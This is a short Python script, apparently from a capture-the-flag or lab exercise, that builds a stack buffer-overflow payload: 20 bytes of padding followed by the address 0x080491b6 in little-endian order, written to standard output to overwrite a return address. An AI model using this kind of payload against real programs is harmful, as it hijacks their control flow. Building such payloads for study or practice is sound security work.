import sys

## ADDRESS: 080491b6

payload = b"AAAAAAAABBBBCCCCDDDD"
payload += b"\x08\x04\x91\xb6"[::-1]

sys.stdout.buffer.write(payload)
